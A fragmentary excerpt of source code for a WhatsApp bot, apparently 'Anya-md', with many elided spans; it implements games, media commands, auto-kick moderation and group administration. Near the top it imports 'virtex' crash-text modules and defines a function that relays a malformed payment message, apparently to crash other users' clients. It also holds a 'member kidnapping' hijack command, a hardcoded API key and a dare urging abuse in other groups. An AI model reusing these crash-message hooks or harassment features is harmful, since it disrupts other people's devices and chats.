...
//warrrrrrrrr
const { xeonvirtex } = require('.//xeonvirtex')
const { xeonbutton } = require('./AnyaBug/xeonbutton')
const { xeonbrutal } = require('./AnyaBug/xeonbrutal')
const { iphone } = require('./AnyaBug/virtex/iphone')
const { iphone5 } = require('./AnyaBug/virtex/iphone5')
const { xeonbutton2 } = require('./AnyaBug/virtex/xeonbutton2')
const { bugsw } = require('./AnyaBug/virtex/bugsw')
const xpicvirus = fs.readFileSync(`./AnyaBug/Anya.jpg`)
//warrrrrrrrrr

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./AnyaMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./AnyaMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./AnyaMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./AnyaMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));
...
if (cek == null) return null
	    ...
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./AnyaMedia/theme/Anya.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
...
//auto recording all
    if (global.autoRecord) { if (m.chat) { Anya.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { Anya.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/Anya-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/Anya-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
...
const AnyaBug = (teks) => {
  Anya.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
...
detectLinks: false,
	...
	//group target \\
const reply = (teks) => {
           Anya.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./AnyaMedia/theme/Anya.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
...
Anya.sendMessage(id, butonna, options)
}
...
let buttonMessage = {
  ...
  contextInfo:{externalAdReply:{
   ...
   Anya.sendMessage(m.chat, buttonMessage, options)
   }
        ...
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                ...
                await Anya.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await Anya.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        ...
        let gclink = (`https://chat.whatsapp.com/`+await Anya.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Anya.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return Anya.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return Anya.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await Anya.sendMessage(m.chat,
			...
			Anya.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
...
kice = m.sender
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
...
//antivirtex by xeon
  ...
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Anya.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
if (isCreator) return m.reply(bvl)
        await Anya.sendMessage(m.chat,
			...
			Anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Anya.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  ...
  if (Autoreply)
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./AnyaMedia/sticker/${anji}.webp`)
					Anya.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply)
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./AnyaMedia/audio/${anju}.mp3`)
					Anya.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply)
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./AnyaMedia/image/${anjh}.jpg`)
					Anya.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) 
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./AnyaMedia/video/${anjh}.mp4`)
					Anya.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }
...
//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await Anya.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, Anya.user.name, m)
...
Type *surrender* to surrender and admit defeat`
	    ...
	    Anya.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
...
Type *surrender* to surrender and admit defeat`
            ...
            if (this.game) {
            delete this.game
            Anya.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
...
*Hi* @${m.mentionedJid[0].split`@`[0]} *Please type accept to accept or type reject to reject`
            ...
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) Anya.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            ...
            case 'chat': {
                ...
                if (args[0] === 'mute') {
                    Anya.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    Anya.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    Anya.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    Anya.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    Anya.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    Anya.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    Anya.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
...
let anugas = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/guessSong.json')
...
Anya.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
Anya.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
}
}
break
            case 'matchquiz': case 'math': {
                ...
                Anya.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
  ...
  case 'slot': {
            ...
            await Anya.sendButtonText(m.chat, buttons, sloth, botname, m)
            }
            break
            case 'soulmate': {
...
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            ...
            let buttons = [
                    ...
                    await Anya.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            case 'couple': {
            if (!m.isGroup) throw mess.group
...
Cieeee, What's Going On❤️💖👀`
            ...
            let buttons = [
                    ...
                    await Anya.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
            }
            break
            case 'buttonmaker': {
            ...
            await Anya.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
	...
	case 'kick': {
		...
		await Anya.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
		...
		await Anya.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
	...
	break
	    case 'setname': case 'setsubject': {
                ...
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await Anya.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                ...
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await Anya.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setbotpp': {
                if (!isCreator) throw mess.owner
...
case 'group': case 'grup': {
                ...
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await Anya.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Successfully Closed The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await Anya.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Successfully Opened The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await Anya.sendButtonText(m.chat, buttons, `Mode Group`, botname, m)
            ...
            case 'editinfo': {
                ...
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await Anya.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await Anya.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await Anya.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)
...
Anya.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                ...
                m.reply(`${Anya.user.name} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                db.data.chats[m.chat].mute = false
                m.reply(`${Anya.user.name} has been unmuted in this group !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await Anya.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                }
             }
             break
case 'chatinfo': {
...
break
            ...
            await Anya.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🙏*\n_Your number will be blocked_\n_If the Report is Only Created_`
            await Anya.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            ...
            case 'bctext': case 'broadcasttext': case 'broadcast':
			    if (!isCreator) throw mess.owner
		            if (!text) throw `Enter text`
                            ...
                            for (let i of data) {
                               Anya.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            break
...
await Anya.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Anya.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
	...
	case 'emojimix2': {
	    ...
	    break
         case 'tts': case 'say':{
             ...
             Anya.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break 
...
m.reply(mess.wait)
mee = await Anya.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await Anya.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
...
case 'toimage': case 'toimg': {
                ...
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    ...
                    Anya.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
...
if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
            ...
            return Anya.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
        break    
...
break
	    case 'ytmp3xx': case 'ytaudioxx': {
                ...
                Anya.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
...
break
            case 'ytmp4xx': case 'ytvideoxx': {
                ...
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                Anya.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                ...
                Anya.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
            }
            break
            case 'waifu': {
            	m.reply(mess.wait)
	    ...
	    case 'couplepp': case 'ppcouple': {
                m.reply(mess.wait)
                let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/couple.json')
...
case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             ...
             let anutexpro = await maker.textpro(link, q)
                Anya.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case'glitch3':
...
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Anya.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
...
Anya.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
...
case 'hoorror':{
     ...
     console.log(anui)
    Anya.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
...
console.log(anuphub)
Anya.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
...
console.log(anutro2)
Anya.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
...
console.log(anuror2)
Anya.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
...
console.log(anubit8)
Anya.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case 'tiktok':{ 
...
Anya.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
...
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Anya.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tiktokgirl':
...
Anya.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokghea':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
...
var hasil = pickRandom(notnot)
Anya.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hijab':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
...
jadibot(Anya, m, m.chat)
}
break
case 'rentbotlist':
try {
let user = [... new Set([...global.conns.filter(Anya => Anya.user).map(Anya => Anya.user)])]
te = "*Bot Rent List*\n\n"
for (let i of user){
let y = await Anya.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Anya.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
...
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    ...
    Anya.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
	        case 'pinterest': {
m.reply(mess.wait)
let { pinterest } = require('./lib/scraper')
...
case 'stickman':
m.reply(mess.wait)
Anya.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'spongebob':
m.reply(mess.wait)
Anya.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'gojosatoru':
m.reply(mess.wait)
Anya.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'nicholas':
m.reply(mess.wait)
Anya.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'cartoon':
m.reply(mess.wait)
Anya.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
break
...
Anya.sendContact(m.chat, owner, m)
}
            break
        case 'menfess':
			case 'menfes':
			...
			case 'confess':
				...
				if (pesan.length < 1) return m.reply(`All must be filled in! eg : confess 91xxxxxxxxxx|from|hello dude`)
				 ...
				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRM‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
					Anya.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
				m.reply(`Success Sending Menfess!!`)
				break
			case 'menfesconfirm':{
 				 Anya.sendMessage(q, {text: `It's been confirmed, Confess🌹`})
...
case 'keluar': case 'leave': {
                ...
                if (!room) {
                    ...
                    await Anya.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await Anya.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
            ...
            case 'mulai': case 'start': {
                ...
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    ...
                    await Anya.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
                    throw false
                }
                ...
                if (room) {
                    ...
                    await Anya.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Anya.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                    ...
                    await Anya.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                ...
                if (!romeo) {
                    ...
                    await Anya.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
                    throw false
                }
                ...
                if (room) {
                    ...
                    await Anya.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await Anya.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
...
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
            ...
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                ...
                Anya.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, Anya.user.name, `*Hello Anya* !`, `Pilih Din`, sections, m)
                }
            }
            break
...
case 'req': case 'request': {
            ...
            await Anya.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank you🙏_`
            await Anya.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'report': case 'bug': {
            	if (!text) throw `Example : ${prefix + command} Report an error feature`
...
case 'sound160':
case 'sound161':
Anya_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Anya.sendMessage(m.chat, { audio: Anya_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'hijack':{
  if(!isCreator) throw mess.owner
  let text1 = q.split("|")[0]
  ...
  if(!text2) throw `Eg:\n${order +' 1234567890@g.us|_amount_'}`
  Anya.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
  await Anya.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
...
case 'setthumb':{
                       ...
                       if (!isQuotedImage) return m.reply('Reply the picture!')
                                 let media = await Anya.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                await fs.writeFileSync('./AnyaMedia/theme/Anya.jpg', media)
               m.reply(mess.success)
            }
          break
case 'creategroup':
...
const group = await Anya.groupCreate(q, [owner + "@s.whatsapp.net"])
m.reply(mess.success)
Anya.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
...
Anya.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
m.reply('Success in turning off youtube video antilink in this group')
  ...
  await Anya.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
...
m.reply('Success in turning off antitoxic in this group')
  ...
  await Anya.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'autoreply': {
...
m.reply('Success in turning off antiwame in this group')
  ...
  await Anya.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antilinkgc': {
...
case 'dare':
    ...
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     ...
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
